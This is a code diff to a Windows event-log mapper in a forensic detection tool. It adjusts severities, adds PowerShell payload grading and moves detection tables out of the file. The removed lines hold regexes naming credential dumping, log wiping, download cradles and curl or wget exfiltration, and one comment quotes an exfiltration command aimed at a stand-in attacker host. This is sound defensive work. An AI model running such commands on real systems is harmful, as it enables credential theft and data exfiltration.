@@ -31,8 +31,16 @@ import {
 } from "./canonicalEvent.js";
 import { toUtcIso } from "./timeUtc.js";
 import { reconTechniques } from "./reconTechniques.js";
-import { tradecraftSignal } from "./tradecraftRules.js";
+import {
+  tradecraftSignal,
+  scriptBlockSignal,
+  LOLBINS,
+  STRONG_CMD,
+  SUSP_CMD,
+  SUSP_PATH,
+} from "./tradecraftRules.js";
 import { secretSpillSignal } from "./secretSpillRules.js";
+import { isBenignLsassAccessor, isBenignThreadSource } from "./benignSources.js";
 import { extractDomains, TEXT_DOMAIN_SKIP_RE, TEXT_FILE_EXT_RE, hasPlausibleTld } from "./textDomains.js";
 
 // Re-exported for the sibling importers, which already source their shared helpers
@@ -330,6 +338,12 @@ interface WinEventDef {
   kind?: "process" | "network" | "dns" | "procaccess" | "file" | "service";
 }
 
+// Groups whose membership IS privilege. An add to one of these is the difference between routine
+// user administration and an attacker granting themselves the domain — so it, not the bare event id,
+// is what earns a group change its High.
+const PRIVILEGED_GROUP =
+  /\b(?:domain admins|enterprise admins|schema admins|administrators|account operators|server operators|backup operators|print operators|dnsadmins|group policy creator owners|domain controllers|enterprise key admins|key admins)\b/i;
+
 // Security + System channel events keyed by Event ID.
 const WIN_EVENTS: Record<number, WinEventDef> = {
   // Authentication / logon
@@ -344,21 +358,21 @@ const WIN_EVENTS: Record<number, WinEventDef> = {
   4771: { label: "Kerberos pre-authentication failed", severity: "Medium", mitre: ["T1110"] },
   4776: { label: "NTLM credential validation", severity: "Low" },
   // Account / group management
-  4720: { label: "User account created", severity: "High", mitre: ["T1136.001"] },
+  4720: { label: "User account created", severity: "Medium", mitre: ["T1136.001"] },
   4722: { label: "User account enabled", severity: "Medium" },
   4723: { label: "Password change attempt", severity: "Low" },
   4724: { label: "Password reset attempt", severity: "Medium", mitre: ["T1098"] },
   4725: { label: "User account disabled", severity: "Medium" },
   4726: { label: "User account deleted", severity: "Medium" },
-  4728: { label: "Member added to global security group", severity: "High", mitre: ["T1098"] },
-  4732: { label: "Member added to local security group", severity: "High", mitre: ["T1098"] },
-  4756: { label: "Member added to universal security group", severity: "High", mitre: ["T1098"] },
+  4728: { label: "Member added to global security group", severity: "Medium", mitre: ["T1098"] },
+  4732: { label: "Member added to local security group", severity: "Medium", mitre: ["T1098"] },
+  4756: { label: "Member added to universal security group", severity: "Medium", mitre: ["T1098"] },
   4738: { label: "User account changed", severity: "Low" },
   4740: { label: "User account locked out", severity: "Medium" },
   4767: { label: "User account unlocked", severity: "Low" },
   // Persistence / execution
-  4697: { label: "Service installed (Security)", severity: "High", kind: "service", mitre: ["T1543.003"] },
-  4698: { label: "Scheduled task created", severity: "High", mitre: ["T1053.005"] },
+  4697: { label: "Service installed (Security)", severity: "Medium", kind: "service", mitre: ["T1543.003"] },
+  4698: { label: "Scheduled task created", severity: "Medium", mitre: ["T1053.005"] },
   4699: { label: "Scheduled task deleted", severity: "Medium", mitre: ["T1053.005"] },
   4700: { label: "Scheduled task enabled", severity: "Low", mitre: ["T1053.005"] },
   4702: { label: "Scheduled task updated", severity: "Medium", mitre: ["T1053.005"] },
@@ -379,7 +393,7 @@ const WIN_EVENTS: Record<number, WinEventDef> = {
   1102: { label: "Security audit log cleared", severity: "High", mitre: ["T1070.001"] },
   4719: { label: "System audit policy changed", severity: "High", mitre: ["T1562.002"] },
   // System channel
-  7045: { label: "Service installed", severity: "High", kind: "service", mitre: ["T1543.003"] },
+  7045: { label: "Service installed", severity: "Medium", kind: "service", mitre: ["T1543.003"] },
   7034: { label: "Service crashed unexpectedly", severity: "Low" },
   7036: { label: "Service state changed", severity: "Info" },
   7040: { label: "Service start type changed", severity: "Low" },
@@ -390,10 +404,11 @@ const WIN_EVENTS: Record<number, WinEventDef> = {
 
 // PowerShell/Operational events, keyed separately from WIN_EVENTS because that table is looked up
 // by EVENT ID ALONE: an unrelated Application-channel event that happens to be 4104 would otherwise
-// be labelled a script block. Severity stays Info deliberately — script-block logging is telemetry,
-// not a verdict, and Info is exactly the floor the forensic gate uses to keep raw telemetry out of
-// the AI's timeline. A script block that IS suspicious is graded by whatever adjudicated it (a Sigma
-// or DetectRaptor verdict, or a tagger rule), the same way 4104 was graded before it had a label.
+// be labelled a script block. The TABLE severity stays Info deliberately — script-block logging is
+// telemetry, not a verdict, and Info is exactly the floor the forensic gate uses to keep raw
+// telemetry out of the AI's timeline. A script block that IS suspicious is promoted off this floor
+// by scriptBlockSignal below, or by whatever else adjudicated it (a Sigma or DetectRaptor verdict,
+// a tagger rule) — the table states the default, not the verdict.
 // The label is the whole point of the entry: without it a parsed script block read as "Event 4104"
 // or as the rendered message's boilerplate first line ("Creating Scriptblock text (1 of 1):").
 const POWERSHELL_EVENTS: Record<number, WinEventDef> = {
@@ -430,109 +445,6 @@ const SYSMON_EVENTS: Record<number, WinEventDef> = {
   25: { label: "Process image tampering", severity: "High", mitre: ["T1055.012"] },
   26: { label: "File delete logged", severity: "Low", mitre: ["T1070.004"] },
 };
-
-// LOLBins whose appearance as the image (Sysmon 1 / 4688) bumps a benign process-create.
-const LOLBINS = new Set([
-  "powershell.exe",
-  "pwsh.exe",
-  "cmd.exe",
-  "wscript.exe",
-  "cscript.exe",
-  "mshta.exe",
-  "rundll32.exe",
-  "regsvr32.exe",
-  "wmic.exe",
-  "certutil.exe",
-  "bitsadmin.exe",
-  "msiexec.exe",
-  "installutil.exe",
-  "regasm.exe",
-  "regsvcs.exe",
-  "msbuild.exe",
-  "cmstp.exe",
-  "schtasks.exe",
-  "at.exe",
-  "sc.exe",
-  "net.exe",
-  "net1.exe",
-  "psexec.exe",
-  "psexesvc.exe",
-  "vssadmin.exe",
-  "bcdedit.exe",
-  "wevtutil.exe",
-  "reg.exe",
-  "curl.exe",
-  "ftp.exe",
-  "hh.exe",
-  "odbcconf.exe",
-]);
-// Core OS processes that legitimately call CreateRemoteThread (Sysmon EID 8) during normal
-// session/process setup — csrss/wininit/services injecting is routine, so we downgrade those
-// from the default High (they stay in the timeline; synthesis/legit-marking can still act).
-// Core OS processes that legitimately CreateRemoteThread as routine session/service setup, PLUS
-// Windows Defender / Defender-for-Endpoint, which inject monitoring threads into user processes as
-// part of behavioral scanning — a benign EID 8 source, not injection tradecraft. Also the desktop/
-// shell brokers that routinely inject as part of ordinary UI plumbing: Windows Search indexing its
-// own protocol host, dllhost.exe (COM Surrogate) loading shell-extension/COM objects, and the UWP
-// app-model brokers taskhostw/RuntimeBroker — all fire constantly on a stock, uncompromised desktop
-// and otherwise drown real injection signal in noise (see the fairhaven-rdp-takeover benchmark,
-// where this exact pairing on unrelated hosts got escalated into a fabricated finding).
-const BENIGN_THREAD_SOURCES = new Set([
-  "csrss.exe",
-  "wininit.exe",
-  "services.exe",
-  "smss.exe",
-  "svchost.exe",
-  "wmiprvse.exe",
-  "lsm.exe",
-  "winlogon.exe",
-  "msmpeng.exe",
-  "mpdefendercoreservice.exe",
-  "mssense.exe",
-  "sensendr.exe",
-  "mpcmdrun.exe", // Defender / MDE
-  "searchindexer.exe",
-  "searchprotocolhost.exe",
-  "dllhost.exe",
-  "taskhostw.exe",
-  "runtimebroker.exe", // shell/UI brokers
-]);
-// Windows-native processes that access LSASS constantly as part of normal operation (#198). A
-// Sysmon EID 10 ProcessAccess to lsass.exe from one of these is NOT credential dumping — Defender /
-// Defender-for-Endpoint scan it on every boot, and core OS processes open it routinely. Keyed on the
-// SourceImage basename; still graded High when the source runs from a SUSPICIOUS path (a masqueraded
-// "svchost.exe" in \Temp\ is not benign), and a non-listed accessor (e.g. a renamed dumper) stays High.
-const BENIGN_LSASS_ACCESSORS = new Set([
-  "msmpeng.exe",
-  "mpdefendercoreservice.exe",
-  "mssense.exe",
-  "sensendr.exe",
-  "mpcmdrun.exe", // Defender / MDE
-  "svchost.exe",
-  "services.exe",
-  "csrss.exe",
-  "wininit.exe",
-  "lsass.exe",
-  "wmiprvse.exe",
-  "smss.exe",
-  "lsm.exe",
-]);
-// Command-line markers strongly associated with attacker tradecraft → stronger bump.
-const STRONG_CMD =
-  /mimikatz|sekurlsa|lsadump|invoke-mimikatz|-dumpcr|comsvcs\.dll.*minidump|vssadmin\s+delete|wbadmin\s+delete|wevtutil\s+cl\b|fsutil\s+usn\s+deletejournal|lsass[^\n]{0,40}\.dmp|\.dmp[^\n]{0,40}lsass|(?:-p|--pid|--process)\s+lsass|nanodump|dumpert|handlekatz|procdump[^\n]*lsass|reg\s+save\s+[^\n]*\\sam\b|ntds\.dit|ntdsutil[^\n]*ifm/i;
-const SUSP_CMD =
-  /-enc\b|-e\s+[A-Za-z0-9+/]{20,}|encodedcommand|frombase64string|-nop\b|-noni\b|-noprofile|-w\s*hidden|-windowstyle\s+hidden|iex\b|invoke-expression|downloadstring|downloadfile|net\.webclient|-bypass|certutil.*-urlcache|bitsadmin.*\/transfer|\/add\b|reg\s+add.*\\run|mysqldump|pg_dump|mongodump|(?:curl|wget)\b[^\n]*(?:--data-binary|--upload-file|\s-T\b|\s-F\b|--form|-d\s+@)/i;
-// Execution from a user-writable / staging directory is itself a weak masquerade/tradecraft signal
-// (#199) — a non-system binary launched from Temp / AppData / Downloads / Public / ProgramData, or
-// /tmp,/dev/shm,/var/tmp on *nix. Tested against the IMAGE path (not the whole command) to avoid
-// matching a path that merely appears as an argument. ProgramData recurs across the DFIR Report and
-// Huntress corpora as ransomware/dropper staging ground (msidxsvc.exe, locker.exe, sc-created
-// payloads, renamed PowerShell) — same Medium-bump tier as the other user-writable paths, not High.
-// EXCEPTION: `\ProgramData\Microsoft\Windows Defender\` is Defender's own legitimate install path
-// (MsMpEng.exe et al. really live there), so it's carved out — otherwise every benign Defender
-// EID 8/10 event would trip the masquerade override in BENIGN_THREAD_SOURCES/BENIGN_LSASS_ACCESSORS.
-const SUSP_PATH =
-  /\\(?:appdata|temp|downloads)\\|\\users\\public\\|\\programdata\\(?!microsoft\\windows defender\\)|(?:^|[\s"])\/(?:tmp|var\/tmp|dev\/shm)\//i;
 
 // Channel → short tool label for the description and source tag.
 function channelLabel(channel: string): string {
@@ -707,6 +619,14 @@ const SUBJECT_KEYS = [
   // #640 failure, in a new place). NOT ScriptBlockId — that is a per-COMPILATION guid, so keying on
   // it would stop genuine repeats of one script from ever aggregating.
   "ScriptBlockText",
+  // 4103's spelling of the same thing: 4104 logs the script TEXT, 4103 logs the command as it was
+  // INVOKED, under Payload. Here for the reason above — a 4103 rendered none of it, so every
+  // pipeline record on one host shared a key and aggregated into one row naming one command. NOT
+  // ContextInfo, its companion field: that is per-session boilerplate (severity, host app, user),
+  // identical across thousands of records, so keying on it would separate nothing and only pad the
+  // description. Note renderFields caps each field at 140 chars, so two commands that first differ
+  // beyond that still merge — the same pre-existing limit ScriptBlockText lives with.
+  "Payload",
   "NewProcessName",
   "ParentImage",
   "ParentCommandLine",
@@ -728,6 +648,16 @@ const SUBJECT_KEYS = [
   "Status",
   "SubStatus",
   "FailureReason",
+];
+
+// This event's own binary, best spelling first — ONE list so `path` and the file-IOC scrape agree.
+const IMAGE_PATH_KEYS = [
+  "Image",
+  "NewProcessName",
+  "ImageLoaded",
+  "TargetFilename",
+  "ServiceFileName",
+  "ImagePath",
 ];
 
 function renderFields(ed: Row, keys: string[]): string {
@@ -910,16 +840,34 @@ export function mapWindows(
   const ed: Row = isObject(edRaw) ? edRaw : {};
   const isSysmon = /sysmon/i.test(channel);
   const isPwsh = /powershell/i.test(channel);
+  // The rendered event message, verbatim. It was read for the unknown-event LABEL and then dropped,
+  // so a Windows event reached the case with `message` UNSET while every other importer populated
+  // it — and the content tagger's default ruleset matches `message`. Twelve of its rules, the ones
+  // targeting Windows event evidence, therefore matched NOTHING on the very events they name: dead
+  // promotion paths that looked live. Kept raw (newlines and tabs intact, uncapped, as
+  // velociraptorImport and hayabusaImport keep theirs) because a rule anchors on that rendering —
+  // `Logon Type:\t\t3` is a real condition — and because the field's contract is the FULL detail
+  // behind the 600-char description.
+  const rawMessage = firstStr(rec, ["message", "Message"]).trim();
   const def: WinEventDef = (isSysmon
     ? SYSMON_EVENTS[eid]
     : isPwsh
       ? POWERSHELL_EVENTS[eid]
       : WIN_EVENTS[eid]) ?? {
-    label: oneLine(firstStr(rec, ["message", "Message"]).split(/[\r\n]/)[0] || `Event ${eid}`).slice(0, 120),
+    label: oneLine(rawMessage.split(/[\r\n]/)[0] || `Event ${eid}`).slice(0, 120),
     severity: "Info",
   };
 
   const tool = channelLabel(channel);
+  // The PowerShell payload this record carries, under either of its two spellings — 4104's script
+  // text or 4103's invoked command. One binding because both readers below must see the same text:
+  // the one that GRADES it and the one that scrapes its indicators. They never co-occur on a record.
+  // ScriptBlockText names its own contents, so it is read wherever it appears — #652 turns on every
+  // shape that reaches a parsed 4104 (Sigma and DetectRaptor rows included) being graded here.
+  // `Payload` does NOT: it is a generic event_data key that any provider may use for anything, so it
+  // counts as a PowerShell payload only on the PowerShell channel. Read it unconditionally and an
+  // unrelated Application event quoting the word IEX is promoted and tagged T1059.001.
+  const psText = isPwsh ? firstStr(ed, ["ScriptBlockText", "Payload"]) : str(getCI(ed, "ScriptBlockText"));
   const accts = winAccounts(ed);
   const subject = renderFields(ed, SUBJECT_KEYS);
   let description = `${tool} ${def.label} (EID ${eid})`;
@@ -927,6 +875,10 @@ export function mapWindows(
   if (subject) description += ` - ${subject}`;
   if (host) description += ` @ ${host}`;
   description = description.slice(0, 600);
+
+  // The service binary, under either channel's spelling (4697 says ServiceFileName, 7045 says
+  // ImagePath). Read before the severity block because that block now grades it.
+  const serviceExe = firstStr(ed, ["ServiceFileName", "ImagePath"]).trim();
 
   // Severity — start from the table, then bump on suspicious process/command.
   let severity = def.severity;
@@ -960,12 +912,42 @@ export function mapWindows(
     // .ssh/id_rsa, …) so the case identifies the enumeration phase even when each command is Info/Low.
     for (const t of reconTechniques(image, cmd)) if (!mitre.includes(t)) mitre.push(t);
   }
+  // A logged script block or pipeline payload is executable content — the same thing a command line
+  // is — so it is graded by the same tables (scriptBlockSignal). Keyed on the FIELD, not the channel
+  // or `kind`: every shape that reaches a parsed 4104/4103 funnels through here, as the IOC scrape
+  // below does.
+  const sbs = scriptBlockSignal(psText);
+  if (sbs) {
+    if (sbs.weight) severity = worst(severity, sbs.weight === "strong" ? "High" : "Medium");
+    for (const t of sbs.mitre) if (!mitre.includes(t)) mitre.push(t);
+  }
+  // What earns a persistence install its High: the payload, not the event id. A service names its
+  // binary in a structured field; a scheduled task hides its action inside the rendered message,
+  // which is the only place the command it runs appears at all. Graded by the same tables a process
+  // creation is, so `sc create` pointing at \Temp\ and a task launching rundll32 from AppData both
+  // land where they did before, while the Chrome and Edge updaters that fire on every endpoint all
+  // day settle at Medium — in the timeline, out of the auto-finding backfill.
+  if (!isSysmon) {
+    const payload =
+      eid === 4697 || eid === 7045 ? serviceExe : eid === 4698 || eid === 4702 ? rawMessage : "";
+    if (payload && (isSuspiciousCmd(payload, payload) || tradecraftSignal("", payload)))
+      severity = worst(severity, "High");
+    // A group add is High when the GROUP is privileged — see PRIVILEGED_GROUP. 4728/4732/4756 name
+    // the group in TargetUserName and the member in MemberName, not the other way round.
+    if (
+      (eid === 4728 || eid === 4732 || eid === 4756) &&
+      PRIVILEGED_GROUP.test(str(getCI(ed, "TargetUserName")))
+    )
+      severity = worst(severity, "High");
+  }
   if (def.kind === "procaccess" && /lsass\.exe$/i.test(str(getCI(ed, "TargetImage")))) {
-    const srcImg = str(getCI(ed, "SourceImage"));
-    const benign = BENIGN_LSASS_ACCESSORS.has(baseName(srcImg).toLowerCase()) && !SUSP_PATH.test(srcImg);
-    if (benign) {
+    if (isBenignLsassAccessor(str(getCI(ed, "SourceImage")))) {
       // Routine OS / Defender LSASS access — keep as Low evidence, NOT a credential-dump finding (#198).
+      // T1003 goes with it — Low is AT the forensic floor, so downgrading alone still handed the AI
+      // an event tagged credential dumping. Same splice the EID 8 branch below does for T1055.
       severity = "Low";
+      const i = mitre.indexOf("T1003");
+      if (i >= 0) mitre.splice(i, 1);
     } else {
       severity = "High";
       if (!mitre.includes("T1003.001")) mitre.push("T1003.001");
@@ -976,8 +958,7 @@ export function mapWindows(
   // T1055 tag so it doesn't drown real signal. A benign name run from a SUSPICIOUS path (a
   // masqueraded svchost.exe in \Temp\) is NOT benign and keeps High + T1055.
   if (isSysmon && eid === 8) {
-    const srcImg = str(getCI(ed, "SourceImage"));
-    if (BENIGN_THREAD_SOURCES.has(baseName(srcImg).toLowerCase()) && !SUSP_PATH.test(srcImg)) {
+    if (isBenignThreadSource(str(getCI(ed, "SourceImage")))) {
       severity = "Low";
       const i = mitre.indexOf("T1055");
       if (i >= 0) mitre.splice(i, 1);
@@ -1009,14 +990,7 @@ export function mapWindows(
 
   // Structured correlation/IOC fields.
   const { sha256, md5 } = parseHashes(rec, ed);
-  const imagePath = firstStr(ed, [
-    "Image",
-    "NewProcessName",
-    "ImageLoaded",
-    "TargetFilename",
-    "ServiceFileName",
-    "TargetImage",
-  ]);
+  const imagePath = firstStr(ed, [...IMAGE_PATH_KEYS, "TargetImage"]);
   const processName =
     def.kind === "process" || def.kind === "procaccess"
       ? baseName(
@@ -1155,9 +1129,7 @@ export function mapWindows(
       ? {
           service: {
             ...(str(getCI(ed, "ServiceName")).trim() ? { name: str(getCI(ed, "ServiceName")).trim() } : {}),
-            ...(str(getCI(ed, "ServiceFileName")).trim()
-              ? { executable: str(getCI(ed, "ServiceFileName")).trim() }
-              : {}),
+            ...(serviceExe ? { executable: serviceExe } : {}),
           },
         }
       : {}),
@@ -1209,7 +1181,7 @@ export function mapWindows(
   }
   if (sha256) addIoc(iocSink, "hash", sha256);
   else if (md5) addIoc(iocSink, "hash", md5);
-  for (const fk of ["Image", "NewProcessName", "ImageLoaded", "TargetFilename", "ServiceFileName"]) {
+  for (const fk of IMAGE_PATH_KEYS) {
     const f = str(getCI(ed, fk)).trim();
     if (f && f !== "-" && /[\\/]/.test(f)) addIoc(iocSink, "file", f);
   }
@@ -1219,15 +1191,15 @@ export function mapWindows(
   // `Invoke-RestMethod -Uri https://mft.attacker.tld -InFile loot.zip` never became an IOC. textIocs
   // already skips internal AD/mDNS zones (.local/.lan/.corp) and filenames, so this stays signal-rich.
   if (def.kind === "process") textIocs(str(getCI(ed, "CommandLine")), iocSink);
-  // A PowerShell 4104 script block is evidence in exactly the same way a command line is — it is
-  // where the download cradle names its C2 — but it arrives under `ScriptBlockText` with no
-  // `kind: "process"` to trigger the scrape above, so a natively-parsed 4104 row yielded NO IOCs at
-  // all: not the URL, not the IP, not the domain (#652). Scraped here rather than on any one
-  // importer's path because every shape that reaches a PARSED 4104 — Velociraptor eventlog, Sigma
-  // and DetectRaptor rows, raw EVTX XML, Chainsaw, generic SIEM records — funnels through
+  // A PowerShell payload is evidence in exactly the same way a command line is — it is where the
+  // download cradle names its C2 — but it arrives under `ScriptBlockText` (4104) or `Payload` (4103)
+  // with no `kind: "process"` to trigger the scrape above, so a natively-parsed row yielded NO IOCs
+  // at all: not the URL, not the IP, not the domain (#652). Scraped here rather than on any one
+  // importer's path because every shape that reaches a PARSED 4104/4103 — Velociraptor eventlog,
+  // Sigma and DetectRaptor rows, raw EVTX XML, Chainsaw, generic SIEM records — funnels through
   // mapWindows. Hayabusa does NOT: it renders events through its own output profile and has its own
   // mapper, which scrapes the script block itself.
-  textIocs(str(getCI(ed, "ScriptBlockText")), iocSink);
+  textIocs(psText, iocSink);
   const dns = str(getCI(ed, "QueryName")).trim();
   if (def.kind === "dns" && dns && dns !== "-" && /\./.test(dns))
     addIoc(iocSink, "domain", dns.replace(/\.$/, ""));
@@ -1262,6 +1234,7 @@ export function mapWindows(
     ...(pid !== undefined ? { pid } : {}),
     // Command line on process-creation events → chainSignature for cross-tool correlation (#68).
     ...(commandLine ? { commandLine } : {}),
+    ...(rawMessage ? { message: rawMessage } : {}),
   };
 }
 
